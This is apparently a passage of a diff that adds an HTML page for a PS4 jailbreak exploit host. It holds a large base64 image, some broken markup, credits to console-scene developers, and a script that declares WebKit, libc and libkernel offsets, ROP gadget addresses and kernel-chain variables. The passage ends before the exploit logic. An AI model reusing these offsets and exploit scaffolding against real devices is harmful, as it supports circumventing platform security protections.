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"125"/></a>
+</href><href id="cnmuhide4"  onmouseover="if(document.getElementById('spoiler3') .style.display=='none') 
+
+</href></center>
+</br>
+<div id="spoiler2" style="display:none"> <br>
+</div>
+<a  style="margin-top: 165px;">
+<h1 style="margin-top: 15px; color: red;">Special Thanks to:<a href="https://twitter.com/sleirsgoevy" style="color:white; margin-left: 15px;">@sleirsgoevy</a><a style="color:white; margin-left: 15px;">ChendoChap</a><a href="https://twitter.com/SpecterDev" style="color:white; margin-left: 15px;">@SpecterDev</a><a style="color:white; margin-left: 15px;">SiSTR0</a><a href="https://twitter.com/Znullptr" style="color:white; margin-left: 15px;">@Znullptr</a><a style="color:white; margin-left: 15px;">All developers who contributed to the ps4 scene ...</a></h1>
+</div>
+<script>
+const OFFSET_wk_vtable_first_element = 0x104F110;
+const OFFSET_WK_memset_import = 0x000002A8;
+const OFFSET_WK___stack_chk_fail_import = 0x00000178;
+const OFFSET_WK_psl_builtin_import = 0xD68;
+const OFFSET_WKR_psl_builtin = 0x33BA0;
+const OFFSET_WK_setjmp_gadget_one = 0x0106ACF7;
+const OFFSET_WK_setjmp_gadget_two = 0x01ECE1D3;
+const OFFSET_WK_longjmp_gadget_one = 0x0106ACF7;
+const OFFSET_WK_longjmp_gadget_two = 0x01ECE1D3;
+const OFFSET_libcint_memset = 0x0004F810;
+const OFFSET_libcint_setjmp = 0x000BB5BC;
+const OFFSET_libcint_longjmp = 0x000BB616;
+const OFFSET_WK2_TLS_IMAGE = 0x38e8020;
+const OFFSET_lk___stack_chk_fail = 0x0001FF60;
+const OFFSET_lk_pthread_create = 0x00025510;
+const OFFSET_lk_pthread_join = 0x0000AFA0;
+var chain;
+var kchain;
+var kchain2;
+var SAVED_KERNEL_STACK_PTR;
+var KERNEL_BASE_PTR;
